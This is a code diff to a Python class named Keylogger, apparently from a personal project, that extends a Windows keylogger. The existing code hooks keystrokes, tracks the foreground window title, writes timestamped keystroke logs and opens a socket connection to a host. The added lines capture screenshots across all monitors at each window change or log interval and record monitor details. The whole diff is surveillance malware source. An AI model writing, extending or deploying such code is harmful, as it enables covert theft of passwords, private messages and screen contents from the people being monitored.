@@ -2,9 +2,13 @@
 import keyboard
 import mouse
 import time
+import pyautogui
 from threading import Thread
-from datetime import datetime, timedelta
 from socket import socket
+from datetime import datetime, timedelta
+from PIL import ImageGrab
+from functools import partial
+from screeninfo import get_monitors
 from win32gui import GetWindowText, GetForegroundWindow
 
 class Keylogger:
@@ -25,6 +29,8 @@ class Keylogger:
         self.host = "127.0.0.1"
         self.port = 1005
 
+        ImageGrab.grab = partial(ImageGrab.grab, all_screens=True)
+
     def keyboard_callback(self, event):
         name = event.name
         if len(name) > 1:
@@ -44,7 +50,7 @@ class Keylogger:
     
     def write_keylogs_to_file(self, foreground_window):
         if self.log:
-            with open(f"keylog-{self.start_time.strftime('%Y-%m-%d-%H-%M-%S')}.txt", "w", encoding="utf-8") as file:
+            with open(f"keylog-{self.start_time.strftime('%Y-%m-%d-%H-%M-%S')}-{self.end_time.strftime('%Y-%m-%d-%H-%M-%S')}.txt", "w", encoding="utf-8") as file:
                 file.write((
                         f"Foreground Window: {foreground_window}\n"
                         f"Starttime: {self.start_time.strftime('%Y-%m-%d-%H-%M-%S')}\n"
@@ -57,18 +63,30 @@ class Keylogger:
             self.start_time = datetime.now()
         self.log = ""
 
+    def write_information_file(self):
+        with open(f"information-{self.start_time.strftime('%Y-%m-%d-%H-%M-%S')}.txt", "w", encoding="utf-8") as file:
+            file.write((
+                    f"Monitors: {get_monitors()}\n"
+                ))
+
+    def make_screenshot(self):
+        pyautogui.screenshot(f"screenshot-{self.start_time.strftime('%Y-%m-%d-%H-%M-%S')}-{self.end_time.strftime('%Y-%m-%d-%H-%M-%S')}.png")
+
     def check_foreground_window(self):
         while self.active:
-            self.end_time = datetime.now()
             current_window = GetWindowText(GetForegroundWindow())
+            timenow = datetime.now()
 
             if current_window != self.foreground_window:
                 self.write_keylogs_to_file(self.foreground_window)
+                self.make_screenshot()
                 self.foreground_window = current_window
                 self.filecounter = 0
 
-            elif (self.end_time - self.start_time) >= timedelta(seconds=self.log_interval):
+            elif (timenow - self.start_time) >= timedelta(seconds=self.log_interval):
+                self.end_time = timenow
                 self.write_keylogs_to_file(current_window)
+                self.make_screenshot()
                 self.filecounter += 1
                 
             time.sleep(self.window_interval)
@@ -81,6 +99,7 @@ class Keylogger:
 
     def start(self):
         self.active = True
+        self.write_information_file()
         self.connect_to_host()
         
         keyboard.on_press(callback=self.keyboard_callback)
